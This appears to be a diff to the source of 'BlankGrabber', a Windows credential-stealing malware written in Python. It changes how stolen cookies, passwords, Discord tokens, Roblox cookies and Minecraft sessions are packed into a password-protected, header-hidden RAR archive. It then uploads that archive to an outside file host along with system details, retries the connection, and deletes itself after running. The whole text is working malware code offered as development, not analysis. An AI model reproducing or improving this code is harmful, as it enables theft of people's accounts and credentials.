@@ -1141,16 +1141,17 @@ class BlankGrabber:
                                     DiscordEXE = os.path.join(filepath, '{}.exe'.format(appname))
                                     subprocess.Popen([UpdateEXE, '--processStart', DiscordEXE], shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
     
-    def CreateArchive(self) -> str | None:
+    def CreateArchive(self) -> tuple[str, str | None]:
         if Utility.GetSelf()[1]:
-            _7zPath = os.path.join(sys._MEIPASS, "7z.exe")
-            if os.path.isfile(_7zPath):
+            rarPath = os.path.join(sys._MEIPASS, "rar.exe")
+            if os.path.isfile(rarPath):
                 password = "blank"
-                process = subprocess.run('{} a -p{} "{}" *'.format(_7zPath, password, self.ArchivePath), capture_output= True, shell= True, cwd= self.TempFolder)
+                process = subprocess.run('{} a -r -hp{} "{}" *'.format(rarPath, password, self.ArchivePath), capture_output= True, shell= True, cwd= self.TempFolder)
                 if process.returncode == 0:
-                    return password
+                    return ("rar", password)
         
         shutil.make_archive(self.ArchivePath.rsplit(".", 1)[0], "zip", self.TempFolder)
+        return ("zip", None)
     
     def UploadToGofile(self, path, filename= None) -> str | None:
         if os.path.isfile(path):
@@ -1171,8 +1172,8 @@ class BlankGrabber:
                 pass
 
     def SendData(self) -> None:
-        password = self.CreateArchive()
-        if (self.Cookies or self.Passwords or self.RobloxCookies or self.DiscordTokens or self.MinecraftFiles) and os.path.isfile(self.ArchivePath):
+        format, password = self.CreateArchive()
+        if (self.Cookies or self.Passwords or self.RobloxCookies or self.DiscordTokens or self.MinecraftSessions) and os.path.isfile(self.ArchivePath):
             computerName = os.getenv("computername")
             computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
             totalMemory = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1])/1000000000)) + " GB"
@@ -1233,7 +1234,7 @@ class BlankGrabber:
   "avatar_url" : image_url
 }
 
-            filename = "Blank-{}.zip".format(os.getlogin())
+            filename = "Blank-{}.{}".format(os.getlogin(), format)
 
             if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 5:
                 url = self.UploadToGofile(self.ArchivePath, filename)
@@ -1300,9 +1301,11 @@ if __name__ == "__main__" and os.name == "nt":
             if Utility.IsConnectedToInternet():
                 BlankGrabber()
                 break
+            else:
+                time.sleep(10)
         except Exception as e:
             print(e)
-            time.sleep(1500)
+            time.sleep(600)
     
     if Settings.Melt and not Utility.IsInStartup():
         Utility.DeleteSelf()
